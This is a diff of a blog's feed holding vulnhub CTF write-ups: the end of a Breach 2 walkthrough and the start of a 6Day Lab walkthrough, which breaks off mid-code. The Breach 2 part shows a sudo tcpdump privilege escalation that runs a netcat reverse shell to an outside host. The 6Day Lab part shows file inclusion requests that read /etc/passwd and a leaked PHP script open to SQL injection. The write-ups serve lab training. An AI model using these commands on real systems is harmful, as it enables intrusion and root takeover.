+Matching Defaults entries for blumbergh on breach2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User blumbergh may run the following commands on breach2:
+    (root) NOPASSWD: /usr/sbin/tcpdump
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice, I can use tcpdump. A quick google for possible exploits around this and I find an interesting one
+&lt;a href=&quot;https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat /tmp/.test
+nc 192.168.110.128 4446 -e /bin/bash
+
+$ chmod +x /tmp/.test
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Set up my listener and got a shell back as root!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/flag.png&quot; alt=&quot;ROOT&quot; /&gt;&lt;/p&gt;</content><author><name>T0w3ntum</name></author><summary type="html">This has been one of the funner vulnerable VM’s I’ve done over at vulnhub so far. mrb3n813 sure can knock them out!</summary></entry><entry><title type="html">6Day Lab: 1.1</title><link href="http://localhost:4000/2016-08-17/6day-lab" rel="alternate" type="text/html" title="6Day Lab: 1.1" /><published>2016-08-17T00:00:00-05:00</published><updated>2016-08-17T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-17/6day-lab</id><content type="html" xml:base="http://localhost:4000/2016-08-17/6day-lab">&lt;p&gt;Like any good pentester, I start off with a quick nmap scan and see what we are
+working with.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@kali:~/Vulnhub/6day# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;400 192.168.1.102
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2016-08-16 17:55 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cypm &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00088s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+8080/tcp filtered http-proxy
+MAC Address: 00:0C:29:FB:09:A8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.13 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A few interesting ports, usually where there is 80, there is gold. A few interesting
+things about the source on the index page though. Have a look.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/6day# curl -X OPTIONS -v http://192.168.1.102
+* Rebuilt URL to: http://192.168.1.102/
+*   Trying 192.168.1.102...
+* Connected to 192.168.1.102 (192.168.1.102) port 80 (#0)
+&amp;gt; OPTIONS / HTTP/1.1
+&amp;gt; Host: 192.168.1.102
+&amp;gt; User-Agent: curl/7.47.0
+&amp;gt; Accept: */*
+&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Date:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Tue&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Aug&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;21:56:18&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;GMT&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Server:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;X-Powered-By:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;10-1ubuntu3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;23&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Vary:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Content-Length:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;1273&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Content-Type:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;html&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Rashomon IPS - Main Page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Rashomon Intrusion Prevention System&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Become immune to every attack!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
+Today we're announcing our brand new product, Rashomon IPS! &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+It's capable of blocking any &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;sophisticated cyber attack&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; which &lt;span class=&quot;nt&quot;&gt;&amp;lt;u&amp;gt;&lt;/span&gt;can harm your
+precious customers.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/u&amp;gt;&lt;/span&gt; (you don't want THAT to happen, do you?) &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg&quot;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+(This guy is coming after your website!) &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Don't waste your time and money by hiring &lt;span class=&quot;nt&quot;&gt;&amp;lt;font&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;color=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#ff00cc&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;pentesters&lt;span class=&quot;nt&quot;&gt;&amp;lt;/font&amp;gt;&lt;/span&gt; and
+doing real security audits. &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+This is the best way to secure your organization and you can completely rely on it,
+and only it! &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+IT'S SO SECURE WE EVEN USE IT ON OUR WEBSITE. &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+So be quick and get a &lt;span class=&quot;nt&quot;&gt;&amp;lt;u&amp;gt;&lt;/span&gt;%15 discount&lt;span class=&quot;nt&quot;&gt;&amp;lt;/u&amp;gt;&lt;/span&gt; on our newest product using the promocode
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;NONEEDFORPENTEST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;. (discount will be available until yesterday)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;promo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkpromo.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+Apply your promo code here: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;promocode&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Apply Promo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+* Connection #0 to host 192.168.1.102 left intact
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Do you see it? Yeah, the src tag for that image. It appears it’s pulling the image
+from an external site. That might be useful…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/6day/image-src.png&quot; alt=&quot;Image.php&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So I suspect I might have an LFI/RFI here that could lead us to our shell. First I’ll
+confirm it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/6day# curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.1.102/image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/passwd
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.1.102...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.1.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/passwd HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.1.102
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Tue, 16 Aug 2016 22:27:56 GMT
+&amp;lt; Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.23
+&amp;lt; Content-Length: 1142
+&amp;lt; Content-Type: image/jpeg
+&amp;lt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:106::/var/run/dbus:/bin/false
+whoopsie:x:104:107::/nonexistent:/bin/false
+landscape:x:105:110::/var/lib/landscape:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+andrea:x:1001:1001::/home/andrea:/bin/andrea
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 192.168.1.102 left intact&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awesome, we can get /etc/passwd. I tried for shadow but that was a no go. At this
+point I try to see if I can include my own shell’s but sadly none of them would
+execute. Time to explore further.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/6day# curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.1.102/image.php?src=/etc/apache2/sites-available/default&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.1.102...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.1.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/apache2/sites-available/default HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.1.102
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Tue, 16 Aug 2016 22:55:27 GMT
+&amp;lt; Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.23
+&amp;lt; Content-Length: 952
+&amp;lt; Content-Type: image/jpeg
+&amp;lt;
+&amp;lt;VirtualHost &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:8080&amp;gt;
+	ServerAdmin webmaster@localhost
+
+	DocumentRoot /var/www
+	&amp;lt;Directory /&amp;gt;
+		Options FollowSymLinks
+		AllowOverride None
+	&amp;lt;/Directory&amp;gt;
+	&amp;lt;Directory /var/www/&amp;gt;
+		Options Indexes FollowSymLinks MultiViews
+		AllowOverride None
+		Order allow,deny
+		allow from all
+	&amp;lt;/Directory&amp;gt;
+
+	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+	&amp;lt;Directory &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/cgi-bin&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+		AllowOverride None
+		Options +ExecCGI &lt;span class=&quot;nt&quot;&gt;-MultiViews&lt;/span&gt; +SymLinksIfOwnerMatch
+		Order allow,deny
+		Allow from all
+	&amp;lt;/Directory&amp;gt;
+
+	ErrorLog &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/error.log
+
+	&lt;span class=&quot;c&quot;&gt;# Possible values include: debug, info, notice, warn, error, crit,&lt;/span&gt;
+	&lt;span class=&quot;c&quot;&gt;# alert, emerg.&lt;/span&gt;
+	LogLevel warn
+
+	CustomLog &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/access.log combined
+
+    Alias /doc/ &lt;span class=&quot;s2&quot;&gt;&quot;/usr/share/doc/&quot;&lt;/span&gt;
+    &amp;lt;Directory &lt;span class=&quot;s2&quot;&gt;&quot;/usr/share/doc/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+        Options Indexes MultiViews FollowSymLinks
+        AllowOverride None
+        Order deny,allow
+        Deny from all
+        Allow from 127.0.0.0/255.0.0.0 ::1/128
+    &amp;lt;/Directory&amp;gt;
+
+&amp;lt;/VirtualHost&amp;gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 192.168.1.102 left intact&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;========================&lt;/span&gt;
+
+root@kali:~/Vulnhub/6day# curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.1.102/image.php?src=/var/www/checkpromo.php&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.1.102...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.1.102 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /image.php?src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/www/checkpromo.php HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.1.102
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Tue, 16 Aug 2016 22:56:21 GMT
+&amp;lt; Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; X-Powered-By: PHP/5.3.10-1ubuntu3.23
+&amp;lt; Content-Length: 565
+&amp;lt; Content-Type: image/jpeg
+&amp;lt;
+&amp;lt;?php
+include &lt;span class=&quot;s1&quot;&gt;'config.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysql_connect&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection failed: &quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;-&amp;gt;connect_error&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT discount, status FROM promocodes WHERE
+promocode='&quot;&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'promocode'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;';&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+mysql_select_db&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysql_query&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Promocode not valid!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
